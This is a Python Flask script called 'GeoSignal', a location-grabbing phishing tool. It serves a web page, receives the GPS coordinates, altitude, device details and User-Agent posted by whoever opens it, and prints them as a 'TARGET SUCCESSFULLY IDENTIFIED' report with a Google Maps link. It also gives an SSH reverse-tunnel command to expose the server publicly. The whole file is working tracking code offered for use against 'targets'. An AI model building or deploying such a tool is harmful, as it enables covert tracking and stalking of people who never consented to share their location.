import os
import datetime
from flask import Flask, render_template, request
from colorama import Fore, Style, init

init(autoreset=True)
app = Flask(__name__)

def banner():
    os.system('clear')
    print(f"{Fore.BLUE}{Style.BRIGHT}")
    print("  ██████╗ ███████╗ ██████╗ ███████╗██╗ ██████╗ ███╗   ██╗ █████╗ ██╗     ")
    print(" ██╔════╝ ██╔════╝██╔═══██╗██╔════╝██║██╔════╝ ████╗  ██║██╔══██╗██║     ")
    print(" ██║  ███╗█████╗  ██║   ██║███████╗██║██║  ███╗██╔██╗ ██║███████║██║     ")
    print(" ██║   ██║██╔══╝  ██║   ██║╚════██║██║██║   ██║██║╚██╗██║██╔══██║██║     ")
    print(" ╚██████╔╝███████╗╚██████╔╝███████║██║╚██████╔╝██║ ╚████║██║  ██║███████╗")
    print("  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝")
    print(f"{Fore.CYAN}{Style.BRIGHT}{' '*45}Made by Hexa Ton")
    print(f"{Fore.BLUE}{'━'*75}{Style.RESET_ALL}")

def show_capture(lat, lon, acc, alt, dev, ua):
    time_now = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    print(f"\n{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  █        [!!!] TARGET SUCCESSFULLY IDENTIFIED [!!!]        █")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ║               🛰️  ADVANCED GEOLOCATION DATA               ║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📌 Latitude  : {Fore.YELLOW}{lat:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📍 Longitude : {Fore.YELLOW}{lon:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📏 Accuracy  : {Fore.YELLOW}{acc:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}⛰️ Altitude  : {Fore.YELLOW}{alt:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🕒 Trace Time: {Fore.GREEN}{time_now:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝")

    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ║                📱 TARGET DEVICE SIGNATURE                ║")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.MAGENTA}  ║  {Fore.WHITE}📱 OS Version: {Fore.YELLOW}{dev:<35}    {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}  ║  {Fore.WHITE}🌐 Platform  : {Fore.YELLOW}Mobile Web Architecture (Browser)      {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}  ║  {Fore.WHITE}🔗 UA-String : {Fore.YELLOW}{ua[:33]:<35}    {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝")

    print(f"\n{Fore.GREEN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ║               📍 INTERACTIVE MAPS OVERLAY                ║")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.GREEN}  ║ {Fore.BLUE}{Style.BRIGHT}https://www.google.com/maps?q={lat},{lon:<12} {Fore.GREEN}║")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    acc = request.form.get('acc', 'N/A')
    alt = request.form.get('alt', 'N/A')
    dev = request.form.get('dev', 'N/A')
    ua = request.headers.get('User-Agent')
    show_capture(lat, lon, acc, alt, dev, ua)
    return "OK"

if __name__ == '__main__':
    banner()
    print(f"{Fore.WHITE}[01] Localhost (Testing)")
    print(f"{Fore.WHITE}[02] Cloudflared {Fore.RED}(Coming Soon){Style.RESET_ALL}")
    print(f"{Fore.WHITE}[03] SSH (Manual Forwarding)")
    
    choice = input(f"\n{Fore.CYAN}GeoSignal > {Style.RESET_ALL}")
    
    import logging
    log_flask = logging.getLogger('werkzeug')
    log_flask.setLevel(logging.ERROR)

    if choice in ['1', '01']:
        banner()
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}+ Server Running Successfully{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] Localhost: http://127.0.0.1:8080")
        app.run(host='0.0.0.0', port=8080)
    elif choice in ['3', '03']:
        banner()
        print(f"{Fore.YELLOW}[!] SSH Instruction: Run 'ssh -R 80:localhost:8080 nokey@localhost.run' in new session.")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}+ Server Running Successfully{Style.RESET_ALL}")
        app.run(host='0.0.0.0', port=8080)
    else:
        print(f"{Fore.RED}[!] Invalid Choice.{Style.RESET_ALL}")
